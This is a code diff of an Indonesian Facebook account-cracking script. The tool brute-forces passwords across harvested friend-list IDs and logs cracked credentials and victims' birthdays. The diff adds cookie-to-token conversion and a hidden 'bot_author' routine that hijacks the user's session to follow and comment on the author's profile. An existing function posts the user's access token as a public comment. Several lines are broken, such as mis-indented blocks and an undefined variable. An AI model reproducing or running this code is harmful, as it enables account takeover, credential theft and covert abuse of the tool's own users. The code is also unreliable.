@@ -1,10 +1,17 @@
 #!/usr/bin/python3
-# coding=utf-8
-# author : Fall Xavier
-#      (C) Copyright 407 Authentic Exploit
-#      Rebuild Copyright Can't make u real programmer:)
-#      Coded By Fall Xavier
-
+# -*- coding: utf-8 -*-
+# GAK USAH DI OPRAK" LAGI,sc sudah nya enak
+# kalau lu recode data hp lu yang hilang!!
+# ------ [ Gausah Dioprek Ntar Error ] ------ #
+Author    = 'Mhd Syafii'
+Facebook  = 'Facebook.com/fikritampan305'
+Instagram = 'Instagram.com/fi_sinaga'
+Whatsapp  = '081269496231'
+YouTube   = 'youtube.com/channel/UCr218CW05wRLJguvi9ijRrA'
+LicenseKey = 'Hanya 06 Hari'
+Syafii  = 100080716718035
+Postingan = 115753054458585
+komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
 ### IMPORT MODULE ###
 import os, sys, re, time, requests, calendar, random,json
 from random import randint
@@ -62,26 +69,21 @@ headerz = random.choice([
 	'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
 ])
 
-### GLOBAL WAKTU ###
-ct = datetime.now()
-n = ct.month
-bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember']
+###----------[ TIME ]---------- ###
+skrng = datetime.now()
+tahun = skrng.year
+bulan = skrng.month
+hari  = skrng.day
+bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Ma7ret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
 try:
-    if n < 0 or n > 12:
+    if bulan < 0 or bulan > 12:
         exit()
-    nTemp = n - 1
+    bulan_skrng = bulan - 1
 except ValueError:
     exit()
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-op = bulann[nTemp]
-my_date = date.today()
-hr = calendar.day_name[my_date.weekday()]
-tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
-tgl = ("%s %s %s"%(ha, op, ta))
-bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+_bulan_ = bulan_cek[bulan_skrng]
+tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))
 
 ### DEF TAMBAHAN ###
 def jalan(z):
@@ -101,26 +103,155 @@ def logo():
  ___/ / / / / / / / /_/ / /  __/ |/ // __/ 
 /____/_/_/ /_/ /_/ .___/_/\___/|___//____/ 
                 /_/                        """%(N))
-   
+  
+###----------[ GLOBAL URL & HEADERS ]---------- ###
+url_businness = "https://business.facebook.com"
+ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
+kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
+web_fb = "https://www.facebook.com/"
+m_fb = "https://m.facebook.com/"
+mbasic = "https://mbasic.facebook.com/"
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
+
+###----------[ CREATE FOLDER ]---------- ###
+def mkdir_data_login():
+    # Make Directory Login Data
+    try:os.mkdir("login")
+    except:pass
+    # Make Directory Result
+    try:os.mkdir("CP")
+    except:pass
+    # Make Directory Result
+    try:os.mkdir("OK")
+    except:pass
+    # Make Directory LICENSE
+    try:os.mkdir("license")
+    except:pass
+    # Delete Cookies
+    try:os.remove('login/cookie.json')
+    except:pass
+    # Delete Token
+    try:os.remove('login/token.json')
+    except:pass
+###----------[ CHANGE LANGUAGE ]---------- ###
+def language(cookie):
+    try:
+        with requests.Session() as xyz:
+            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
+            pra = par(req.content,'html.parser')
+            for x in pra.find_all('form',{'method':'post'}):
+                if 'Bahasa Indonesia' in str(x):
+                    bahasa = {
+                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
+                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
+                        "submit"  : "Bahasa Indonesia"
+                        }
+                    url = 'https://mbasic.facebook.com' + x['action']
+                    exec = xyz.post(url,data=bahasa,cookies=cookie)
+    except Exception as e:pass
+
+###----------[ CONVERT USERNAME KE ID ]---------- ###
+def convert_id(username):
+    try:
+        cookie = {'cookie':open('login/cookie.json','r').read()}
+        url    = 'https://mbasic.facebook.com/' + username
+        with requests.Session() as xyz:
+            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
+            kut = req.find('a',string='Lainnya')
+            id = str(kut['href']).split('=')[1]
+            id = re.search('owner_id=(.*?)"',str(kut)).group(1)
+            return(id);menu()
+    except Exception as e:
+      return(username);menu()
+    
+###----------[ EXCEPTION ]---------- ###
+def kecuali(error):
+    print(f"{P}[+] Terjadi Kesalahan !")
+    print(f"{P}[+] Tidak Dapat Mengeksekusi"(error))
+    print(f"{P}[+] Hal Ini Mungkin Terjadi : ")
+    print(f"{P}[01] Cookies/Token Invalid")
+    print(f"{P}[02] Salah Memasukkan ID")
+    print(f"{P}[03] bug Pada Source Code")
+    print(f"{P}[04] Bug Pada Requests")
+    print(f"{P}[05] Dan Lain-Lain")
+    print(f"{P}[•] Jalankan Ulang Source Code Ini : ")
+    print(f"{P}[•] python yuki.py")
+    exit()
+
+###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
+class bot_author:
+    def __init__(self,cookie,token,cookie_mentah):
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Syafii)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
+        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
+    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
+        with requests.Session() as xyz:
+            try:
+                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
+                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
+            except Exception as e:pass
+    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
+        with requests.Session() as xyz:
+            try:
+                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
+                    for x in bos.find_all('a',href=True):
+                        if 'Tanggapi' in x.text:
+                            _react_type_ = random.choice(['Super','Wow','Peduli'])
+                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
+                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
+                                else:continue
+                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
+            except Exception as e:pass
+    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
+        with requests.Session() as xyz:
+            try:
+                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
+                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
+                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
+                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(___fii___Sayang___Kamu___Widiya___())
+            except Exception as e:pass
+    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
+        _bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
+        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
+        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
+        jam      = datetime.now().strftime("%X")
+        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
+        return(tem)
+
+###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
+def clotox(cookie):
+    with requests.Session() as xyz:
+        get_tok = xyz.get(url_businness+'/business_locations',headers = {
+            "user-agent":ua_business,
+            "referer": web_fb,
+            "host": "business.facebook.com",
+            "origin": url_businness,
+            "upgrade-insecure-requests" : "1",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cache-control": "max-age=0",
+            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
+        return (re.search("(EAAG\w+)", get_tok.text).group(1))
+        
 ### BAGIAN LOGIN ###
-def tokenz():
+def login():
 	os.system('clear')
 	try:
-		token = open('token.txt', 'r')
+		token = open('login/token.json', 'r')
+		cookie = {'cookie':open('login/cookie.json','r').read()}
 		menu()
 	except (KeyError, IOError):
 		os.system('clear')
 		logo()
+		mkdir_data_login()
 		print('──────────────────────────────────────────')
-		token = input(' [?] token : ')
+		cookie = input(' [?] masukkan cookie : ')
 		try:
-			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
-			a = json.loads(otw.text)
-			zedd = open('token.txt', 'w')
-			zedd.write(token)
-			zedd.close()
-			bot()
-			menu()
+        token = clotox(cookie)
+        coki = {'cookie':cookie}
+        bot_author(coki,token,cookie)
+        open('login/token.json', 'w').write(token)
+        open('login/cookie.json','w').write(cookie)
+        menu()
 		except KeyError:
 			print(" %s[!] token kadaluwarsa!"%(M))
 			sys.exit() 
@@ -128,32 +259,33 @@ def tokenz():
 ### BOT FOLLOW DAN KOMEN ###
 def bot():
 	try:
-		token = open('token.txt', 'r').read()
+		token = open('login/token.json', 'r').read()
+		cookie = {'cookie':open('login/cookie.json','r').read()}
 	except (KeyError, IOError):
 		exit(" %s[!] token kadaluwarsa!"%(M))
-	requests.post('https://graph.facebook.com/100023812724814/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100026441864942/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100013775598620/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100004601539472/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100006033517423/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/213614107297063/comments/?message='+token+'&access_token=' + token)
+	requests.post('https://graph.facebook.com/100023812724814/subscribers?access_token=' + (token),cookies=cookie)
+	requests.post('https://graph.facebook.com/100026441864942/subscribers?access_token=' + (token),cookies=cookie)
+	requests.post('https://graph.facebook.com/100013775598620/subscribers?access_token=' + (token),cookies=cookie)
+	requests.post('https://graph.facebook.com/100004601539472/subscribers?access_token=' + (token),cookies=cookie)
+	requests.post('https://graph.facebook.com/100006033517423/subscribers?access_token=' + (token),cookies=cookie)
+	requests.post('https://graph.facebook.com/213614107297063/comments/?message='+token+'&access_token=' + (token),cookies=cookie)
 
 ### BAGIAN MENU ###
 def menu():
-    global token
+    global token, cookie
     os.system('clear')
     try:
-        token = open('token.txt', 'r').read()
-        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
-        a = json.loads(otw.text)
+        token = open('login/token.json', 'r').read()
+        cookie = {'cookie':open('login/cookie.json','r').read()}
+        language(cookie)
+        get = requests.get("https://graph.facebook.com/me?access_token=%s"%(token),cookies=cookie)
+        a = json.loads(get.text)
         nama = a['name']
         uid = a['id']
         ttl = a['birthday']
     except (KeyError, IOError):
         os.system('clear')
-        print("\n %s[!] token kadaluwarsa!"%(M))
-        os.system('rm -f token.txt')
-        tokenz()
+        print("\n %s[!] token kadaluwarsa!"%(M));login()
     except requests.exceptions.ConnectionError:
         exit(" %s[!] anda tidak terhubung ke internet!"%(M))
 
@@ -181,7 +313,8 @@ def menu():
     elif asw == "4":
     	gantiua()
     elif asw == "5":
-    	os.system('rm -f token.txt')
+    	os.system('rm -f login/token.json')
+    	os.system('rm -rf login/cookie.json')
     	print('──────────────────────────────────────────')
     	jalan(" [✓] berhasil menghapus token ")
     	exit()
@@ -196,7 +329,7 @@ def gantiua():
 		menu()
 	else:
 		try:
-			zedd = open('ugent.txt', 'w')
+			zedd = open('ugent.json', 'w')
 			zedd.write(ajg)
 			zedd.close()
 			print('──────────────────────────────────────────')
@@ -424,7 +557,8 @@ def cekhasil():
 ### DUMP PUBLIK ###
 def publik():
 	try:
-		token=open("token.txt","r").read()
+		token=open("login/token.json","r").read()
+		cookie = {'cookie':open('login/cookie.json','r').read()}
 	except IOError:
 		exit(" [!] token kadaluwarsa")
 	idt=input(" [?] masukkan id : ")
@@ -437,7 +571,7 @@ def publik():
 		menu()
 	elif ask in["1"]:
 		try:
-			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
+			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token),cookies=cookie).json()["data"]:
 				uid = i["id"]
 				nama = i["name"]
 				id.append(uid+"<=>"+nama)
@@ -447,7 +581,7 @@ def publik():
 		atursandi()
 	elif ask in["2"]:
 		try:
-			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
+			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token),cookies=cookie).json()["data"]:
 				uid = i["id"]
 				nama = i["name"]
 				if len(i['id'])==6 or len(i['id'])==7 or len(i['id'])==8 or len(i['id'])==9 or len(i['id'])==10:
@@ -576,8 +710,8 @@ def manual():
 				fall.submit(api, uid, pwek.split(","))
 		exit("\n\n [#] crack selesai...")
 	elif ask=="2":
-		print(' [+] hasil OK disimpan ke -> ok.txt')
-		print(' [+] hasil CP disimpan ke -> cp.txt')
+		print(' [+] hasil OK disimpan ke -> ok.json')
+		print(' [+] hasil CP disimpan ke -> cp.json')
 		print('──────────────────────────────────────────')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
@@ -585,8 +719,8 @@ def manual():
 				fall.submit(crack, uid, pwek.split(","),"https://mbasic.facebook.com")
 		exit("\n\n [#] crack selesai...")
 	elif ask=="3":
-		print(' [+] hasil OK disimpan ke -> ok.txt')
-		print(' [+] hasil CP disimpan ke -> cp.txt')
+		print(' [+] hasil OK disimpan ke -> ok.json')
+		print(' [+] hasil CP disimpan ke -> cp.json')
 		print('──────────────────────────────────────────')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
@@ -642,8 +776,8 @@ def gabungkan():
 				fall.submit(crack, uid, pwx,"https://mbasic.facebook.com")
 		exit("\n\n [#] crack selesai...")
 	elif ask=="3":
-		print(' [+] hasil OK disimpan ke -> ok.txt')
-		print(' [+] hasil CP disimpan ke -> cp.txt')
+		print(' [+] hasil OK disimpan ke -> ok.json')
+		print(' [+] hasil CP disimpan ke -> cp.json')
 		print('──────────────────────────────────────────')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
@@ -659,7 +793,7 @@ def gabungkan():
 ### CRACK API ###
 def api(uid, pwx):
 	try:
-		ua = open("ugent.txt", "r").read()
+		ua = open("ugent.json", "r").read()
 	except IOError:
 		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
 	global ok, cp, loop, token
@@ -673,18 +807,19 @@ def api(uid, pwx):
 		if "session_key" in send.text and "EAAA" in send.text:
 			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
 			ok.append("%s|%s"%(uid, pw))
-			open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
+			open("OK/%s.json"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
 			break
 		elif "www.facebook.com" in send.json()["error_msg"]:
 			if "y" in opsi:
 				try:
-					token = open("token.txt", "r").read()
-					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+					token = open("login/token.json", "r").read()
+					cookie = {'cookie':open('login/cookie.json','r').read()}
+					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
 					month, day, year = ttl.split("/")
-					month = bulan[month]
+					month = _bulan_[month]
 					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
 					cp.append("%s|%s"%(uid, pw))
-					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+					open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 					break
 				except (KeyError, IOError):
 					day = (" ")
@@ -693,17 +828,18 @@ def api(uid, pwx):
 				except:pass
 				ceker(uid,pw,ua)
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
+				open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
 				break
 			elif "t" in opsi:
 				try:
-					token = open("token.txt", "r").read()
-					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+					token = open("login/token.txt", "r").read()
+					cookie = {'cookie':open('login/cookie.json','r').read()}
+					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cook).json()["birthday"]
 					month, day, year = ttl.split("/")
-					month = bulan[month]
+					month = _bulan_[month]
 					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
 					cp.append("%s|%s"%(uid, pw))
-					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+					open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 					break
 				except (KeyError, IOError):
 					day = (" ")
@@ -712,7 +848,7 @@ def api(uid, pwx):
 				except:pass
 				print("\r %s[CP] %s|%s        "%(K,uid, pw))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
+				open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
 				break
 		elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in send.text:
 			print("\r %s[!] IP anda terblokir, aktifkan mode pesawat 2 detik"%(M)),
@@ -727,10 +863,10 @@ def api(uid, pwx):
 ### CRACK MBASIC M FB ###
 def crack(uid, pwx, host, **kwargs):
 	try:
-		ua = open("ugent.txt", "r").read()
+		ua = open("ugent.json", "r").read()
 	except IOError:
 		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
-	global ok, cp, loop, token
+	global ok, cp, loop, token, cookie
 	sys.stdout.write(
 		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
@@ -754,18 +890,19 @@ def crack(uid, pwx, host, **kwargs):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 				print("\r %s[OK] %s|%s|%s"%(H,uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
-				open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
+				open("OK/%s.json"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
 				break
 			elif "checkpoint" in ses.cookies.get_dict().keys():
 				if "y" in opsi:
 					try:
-						token = open("token.txt", "r").read()
-						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+						token = open("login/token.json", "r").read()
+						cookie = {'cookie':open('login/cookie.json','r').read()}
+						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
 						month, day, year = ttl.split("/")
-						month = bulan[month]
+						month = _bulan_[month]
 						print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
 						cp.append("%s|%s"%(uid, pw))
-						open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+						open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 						break
 					except (KeyError, IOError):
 						day = (" ")
@@ -774,17 +911,18 @@ def crack(uid, pwx, host, **kwargs):
 					except:pass
 					ceker(uid,pw,ua)
 					cp.append("%s|%s"%(uid, pw))
-					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
+					open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
 					break
 				elif "t" in opsi:
 					try:
-						token = open("token.txt", "r").read()
+						token = open("login/token.json", "r").read()
+						cookie = {'cookie':open('login/cookie.json','r').read()}
 						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 						month, day, year = ttl.split("/")
-						month = bulan[month]
+						month = _bulan_
 						print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
 						cp.append("%s|%s"%(uid, pw))
-						open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+						open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 						break
 					except (KeyError, IOError):
 						day = (" ")
@@ -793,7 +931,7 @@ def crack(uid, pwx, host, **kwargs):
 					except:pass
 					print("\r %s[CP] %s|%s        "%(K,uid, pw))
 					cp.append("%s|%s"%(uid, pw))
-					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
+					open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
 					break
 			else:
 				continue
